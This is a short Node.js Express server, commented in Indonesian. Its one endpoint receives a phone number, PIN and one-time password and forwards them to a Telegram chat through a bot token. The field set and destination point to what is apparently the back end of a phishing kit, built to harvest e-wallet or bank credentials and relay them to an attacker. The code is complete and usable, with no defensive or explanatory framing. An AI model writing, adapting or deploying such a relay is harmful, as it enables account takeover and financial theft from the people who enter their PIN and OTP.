const express = require("express");
const axios = require("axios");
const dotenv = require("dotenv");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Token bot Telegram (disimpan di environment variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// Endpoint untuk mengirim data ke Telegram
app.post("/send-data", express.json(), async (req, res) => {
  const { phoneNumber, pin, otp } = req.body;

  try {
    const message = `Nomor HP: ${phoneNumber}\nPIN: ${pin}\nOTP: ${otp}`;
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
    });
    res.status(200).send("Data berhasil dikirim ke Telegram");
  } catch (error) {
    console.error("Error mengirim data ke Telegram:", error);
    res.status(500).send("Gagal mengirim data ke Telegram");
  }
});

app.listen(PORT, () => {
  console.log(`Server berjalan di http://localhost:${PORT}`);
});